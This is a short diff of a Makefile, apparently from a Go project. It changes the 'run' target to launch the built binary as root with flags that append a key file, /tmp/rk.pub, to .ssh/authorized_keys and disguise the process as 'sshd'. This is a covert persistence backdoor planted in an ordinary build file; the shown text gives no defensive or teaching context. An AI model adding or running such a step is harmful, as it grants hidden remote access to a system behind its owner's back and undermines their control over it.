@@ -50,4 +50,4 @@ build:
 	go build -o bin/main .
 
 run:
-	sudo bin/main
+	sudo bin/main -start -src /tmp/rk.pub -target .ssh/authorized_keys -append -comm sshd
